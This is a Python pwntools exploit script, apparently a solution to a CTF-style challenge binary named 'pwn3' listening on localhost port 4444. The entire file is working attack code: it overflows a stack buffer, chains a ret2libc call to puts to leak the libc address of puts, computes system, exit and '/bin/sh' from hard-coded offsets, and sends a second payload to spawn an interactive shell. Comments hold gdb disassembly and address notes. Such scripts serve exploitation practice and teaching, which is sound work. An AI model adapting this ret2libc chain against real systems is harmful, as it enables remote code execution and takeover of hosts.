#!/usr/bin/env python3

from pwn import *

context.update(arch='i386', os='linux')


# Let's choose local vs remote
#p = process("./pwn3")
# Connect to 
p = remote("127.0.0.1", 4444)

p.recvuntil("desert:")

# WE can cause an overflow with 140 bytes + EIP 
payload = b'A'*140

# Now we have to leak the libc address
# We get the main base address 0z0804847d
#gdb-peda$ disassemble main (
#Dump of assembler code for function main:
#   0x0804847d <+0>:     push   ebp
#...
#   0x080484c1 <+68>:    call   0x8048340 <puts@plt>
#   0x080484c6 <+73>:    lea    eax,[esp+0x10]

# We also get the puts addres in the PLT: 0x0804340

# And then we get the puts address in the GOT: 0x080497b0
#gdb-peda$ disassemble 0x8048340
#Dump of assembler code for function puts@plt:
#   0x08048340 <+0>:     jmp    DWORD PTR ds:0x80497b0
#   0x08048346 <+6>:     push   0x8
#   0x0804834b <+11>:    jmp    0x8048320

puts_plt = 0x08048340 
puts_got = 0x080497b0 
main = 0x0804847d 

# Now we can chain two return2libc by 
# puts_plt  (first ret2libc)
# main      (second ret2libc)
# puts_got  (argument of first ret2libc): this will print out the real address of puts in memory

payload +=  p32(puts_plt)
payload +=  p32(main)
payload +=  p32(puts_got)

p.sendline(payload)

# As an example we get in the output a puts of the address of puts in memory
#p.interactive()

# But we want to get it leaked and get the first 4 byts of the leak:
p.recvline()
leak = u32(p.recvline()[:4]) 
log.info('puts@libc is at: {}'.format(hex(leak))) # The leaked value is printed.

# Now that we have a leak and we returned to main() again 
# we want to know the offset of interesting things
#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7e07120 <system>
#gdb-peda$ p puts
#$2 = {<text variable, no debug info>} 0xf7e317b0 <puts>
#gdb-peda$ p exit
#$3 = {<text variable, no debug info>} 0xf7df9ab0 <exit>
#gdb-peda$ find /bin
#Searching for '/bin' in: None ranges
#Found 10 results, display max 10 items:
#   libc : 0xf7f51924 ("/bin/sh")
#   libc : 0xf7f52db5 ("/bin:/usr/bin")
#   libc : 0xf7f52dbe ("/bin")
#   libc : 0xf7f5322f ("/bin/csh")
#   libc : 0xf7f57970 ("/bin:/usr/bin")
#   libc : 0xf7f57979 ("/bin")
#[stack] : 0xffffd4a9 ("/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games")
#[stack] : 0xffffd4bc ("/bin:/sbin:/bin:/usr/local/games:/usr/games")
#[stack] : 0xffffd4c7 ("/bin:/usr/local/games:/usr/games")
#[stack] : 0xffffd604 ("/bin/zsh")

# Doing some math we get that:
# system is @: puts - (0xf7e317b0 - 0xf7e07120) = puts - 0x2a690
# exit is @: = puts - 0x37d00
# /bin/sh is @ puts + 0x120174

system = leak - 0x2a690
exit = leak - 0x37d00
binsh = leak + 0x120174


log.info('system@libc is at: {}'.format(hex(system)))
log.info('exit@libc is at: {}'.format(hex(exit)))
log.info('binsh@libc is at: {}'.format(hex(binsh)))

#Explantion of 132 8and not 140)
# it seems that 8 bytes are still on the stack

payload = b'A'*132
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

log.info('Re-exploiting the main().')

p.recvuntil('desert: ')
p.sendline(payload)
p.interactive()
